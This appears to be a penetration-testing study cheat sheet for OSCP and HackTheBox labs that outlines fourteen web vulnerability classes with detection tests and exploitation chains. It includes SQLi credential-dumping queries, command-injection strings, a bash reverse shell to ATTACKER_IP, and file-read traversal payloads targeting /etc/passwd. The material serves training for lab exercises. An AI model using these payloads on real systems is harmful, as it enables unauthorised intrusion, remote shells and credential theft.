
# ✅ **WEB VULNERABILITY KNOWLEDGE BASE (OSCP + HTB Focused)**

Below are the 15 most common web vulns appearing across OSCP labs + HackTheBox boxes.

## **INDEX**

1. SQL Injection (SQLi)
2. Command Injection
3. Local File Inclusion (LFI)
4. Remote File Inclusion (RFI – legacy)
5. Server-Side Template Injection (SSTI)
6. Server-Side Request Forgery (SSRF)
7. Broken Authentication / Weak Login
8. Insecure Direct Object Reference (IDOR)
9. File Upload Vulnerabilities
10. Path Traversal
11. Deserialization Vulnerabilities
12. XXE (XML External Entity)
13. Cookie / Session Misconfigurations
14. Hidden Admin Panels / Logic Flaws
15. Misconfigured Web Servers (Apache/Nginx/PHP)

---

# ============================================

# **1. SQL INJECTION (SQLi)**

# ============================================

## **Vulnerability Type**

User-controlled input is embedded into SQL queries without sanitization, allowing query manipulation.

---

## **Common Vulnerable URL Patterns**

```
page.php?id=1
item?id=5
search?q=phone
login?user=admin&pass=123
product.php?category=2
api/user?uid=1001
```

POST forms usually contain:

```
username=admin
password=123
```

---

## **Detection Steps (Safe & OSCP-Compliant)**

### **Basic Test Characters**

```
'
"
)
--
#
))
' OR '1'='1
```

### **What to Look For**

* SQL errors (MySQL, MSSQL, Postgres)
* Response length changes
* Authentication bypass
* Data extraction (in labs)

---

## **Exploitation Chain (HTB/OSCP Style)**

### **1. Determine SQLi Type**

* Boolean-based
* Error-based
* UNION-based
* Time-based
* Out-of-band (rare)

### **2. Extract Data**

Typical UNION extraction:

```
id=1 UNION SELECT 1,2,3
```

### **3. Dump Credential Tables**

```
UNION SELECT username, password FROM users
```

### **4. Password Reuse Tests**

Use creds on:

* SSH
* FTP
* Admin panels
* WinRM (HTB Windows boxes)

### **5. Initial Foothold**

Valid credentials → remote service login → low-priv shell.

---

## **Privilege Escalation Checklist**

* Check user groups
* Check sudo rights (`sudo -l`)
* Weak file permissions
* Cron jobs
* SUID binaries
* Stored passwords inside config files

---

## **Full Attacker Workflow**

1. Identify injectable param
2. Verify injection
3. Determine injection type
4. Extract credentials or sensitive data
5. Use creds to gain foothold (SSH/Web/FTP)
6. Enumerate system
7. Privilege escalation
8. Capture user/root flags

---

# ============================================

# **2. COMMAND INJECTION**

# ============================================

## **Vulnerability Type**

User input is passed directly into OS commands.

---

## **Vulnerable URL Patterns**

```
ping.php?ip=1.1.1.1
backup?file=data
test?host=localhost
diag?cmd=ls
```

Forms:

```
Enter host to check
Enter filename to convert
```

---

## **Detection Steps**

Safe input tests:

```
; id
&& whoami
| uname -a
```

### Indicators:

* Output appears in response
* Delay (if using sleep)
* Server errors

---

## **Exploitation Chain**

1. Confirm injection
2. Execute harmless commands
3. Trigger reverse shell (lab environments)
4. Stabilize TTY
5. Privilege escalate

---

## **Common Payload (training safe example)**

```
; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

---

## **Privesc Checklist**

* Check sudo rights
* SUID binaries
* Writable scripts
* Cron jobs
* Capabilities

---

## **Workflow**

1. Identify command-executing functionality
2. Inject test chars
3. Achieve command execution
4. Spawn reverse shell
5. Enumerate local privesc vectors
6. Escalate to root

---

# ============================================

# **3. LOCAL FILE INCLUSION (LFI)**

# ============================================

## **Type**

Application includes local files based on user input.

---

## **Vulnerable Patterns**

```
page=about
?file=news
?template=profile
download?doc=readme
```

---

## **Detection Tests**

```
../../../../etc/passwd
../../../../var/log/apache2/access.log
php://filter/convert.base64-encode/resource=index.php
```

---

## **Exploitation Chain**

LFI → Code Execution via:

* log poisoning
* upload folder inclusion
* session poisoning
* wrapper attacks

---

## **Privesc Checklist**

* read config creds
* check /var/www for passwords
* enumerate services
* sudo misconfigs

---

## **Workflow**

1. Identify inclusion param
2. Attempt path traversal
3. Read sensitive files
4. Find credentials
5. Foothold
6. Privilege escalate

---

# ============================================

# **4. SERVER-SIDE TEMPLATE INJECTION (SSTI)**

# ============================================

## **Type**

User input is interpreted by template engines (Jinja2, Twig, Smarty, etc.).

---

## **Patterns**

```
/hello?name=John
/profile?user=Alice
```

---

## **Detection Tests**

```
{{7*7}}
${7*7}
<%= 7*7 %>
```

If output is **49**, it’s vulnerable.

---

## **Exploitation Chain**

SSTI → Remote Code Execution

---

## **Privesc Checklist**

(as usual for web shells)

* sudo -l
* passwords in env
* capabilities

---

## **Workflow**

1. Detect SSTI
2. Execute basic expressions
3. Escalate to RCE
4. Reverse shell
5. Privilege escalation

---

# ============================================

# **5. SERVER-SIDE REQUEST FORGERY (SSRF)**

# ============================================

## **Type**

Application makes outbound requests based on user input.

---

## **Patterns**

```
?url=http://example.com
?feed=http://mysite/rss
?api=http://host/data
```

---

## **Detection Tests**

Try internal addresses:

```
http://127.0.0.1:22
http://localhost/admin
```

---

## **Exploitation Chain**

SSRF → internal admin → RCE → shell.

---

## **Privesc Checklist**

* gather credentials
* internal services enumeration

---

## **Workflow**

1. Identify external fetch parameter
2. Test internal addresses
3. Discover internal admin panel
4. RCE inside network
5. Privilege escalate

---

# ============================================

# **6. FILE UPLOAD VULNERABILITIES**

# ============================================

## **Patterns**

```
upload.php
profile picture upload
support ticket file upload
cms upload panel
```

---

## **Detection Steps**

Look for:

* no extension checking
* weak MIME validation
* file stored in webroot

---

## **Exploitation Chain**

Upload → Web Shell → Reverse Shell → Local privesc

---

## **Common Payload (safe example name):**

`payload.php`

---

## **Workflow**

1. Upload test file
2. Bypass filters
3. Upload script
4. Execute
5. Reverse shell
6. Enumerate
7. Root

---

# ============================================

# **7. DESERIALIZATION VULNERABILITIES**

# ============================================

## **Patterns**

```
?data=BASE64_OBJECT
cookies that decode into PHP serialized objects
Remember-Me tokens
```

---

## **Detection**

* Look for serialized formats:

  * PHP: `O:8:"stdClass":...`
  * Java: “ac ed 00 05”
  * Python pickle signatures

---

## **Exploitation**

Malicious gadget chain → RCE.

---

## **Workflow**

1. Identify serialization
2. Modify structure
3. Trigger unsafe deserialization
4. Reverse shell
5. Privilege escalate

---

# ============================================

# **8. XXE (XML External Entities)**

# ============================================

## **Patterns**

File upload or API endpoints accepting XML:

```
POST /api/v1/import
Content-Type: application/xml
```

---

## **Detection Test (safe payload)**

```
<!DOCTYPE foo [ <!ENTITY test "XXE_TEST"> ]>
<foo>&test;</foo>
```

If output returns "XXE_TEST", it’s vulnerable.

---

## **Exploitation Chain**

XXE → File read → Credential theft → Foothold

---

## **Workflow**

1. Submit controlled XML
2. Detect XXE
3. Read sensitive files
4. Use credentials
5. Privilege escalate

---

# ============================================

# **9. IDOR (Insecure Direct Object Reference)**

# ============================================

## **Patterns**

```
/user/1001
/api/order?order_id=553
/download?file=user_1.pdf
/profile?uid=10
```

---

## **Detection Steps**

Change integer/object identifiers:

```
uid=2
order_id=1
file=user_999.pdf
```

---

## **Exploitation**

IDOR → Sensitive Info → Credential reuse → Foothold

---

## **Workflow**

1. Identify ascending IDs
2. Access another user’s data
3. Extract passwords/keys
4. Use creds for login
5. Local privesc

---

# ============================================

# **10. PATH TRAVERSAL**

# ============================================

## **Patterns**

```
?file=report.pdf
?img=cat.png
```

---

## **Detection Tests**

```
../../../../etc/passwd
../../../../windows/win.ini
```

---

## **Exploitation**

* read configs
* obtain credentials
* laterally move to system access

---

# ============================================

# **11. BROKEN AUTHENTICATION**

# ============================================

## **Patterns**

* weak login
* default credentials
* no rate limit

---

## **Detection**

Try common accounts:

* admin:admin
* test:test

---

## **Exploitation**

Login → Foothold → Privesc

---

# ============================================

# **12. COOKIE MISCONFIGURATION**

# ============================================

## **Patterns**

* base64 cookies
* JWT with no signature
* sessions predictable

---

## **Exploitation**

Cookie tampering → Access elevation → Foothold

---

# ============================================

# **13. LOGIC FLAWS**

# ============================================

## Examples**

* password reset without token
* bypassing multi-step forms
* skipping payment steps

---

## **Exploitation**

Logic flaw → admin access → RCE feature → shell

---

# ============================================

# **14. MISCONFIGURED WEB SERVERS**

# ============================================

## **Patterns**

* overly permissive Apache conf
* backup files exposed
* .git folder accessible

---

## **Exploitation**

* source code leak
* credential leak
* RCE via debug endpoints

---


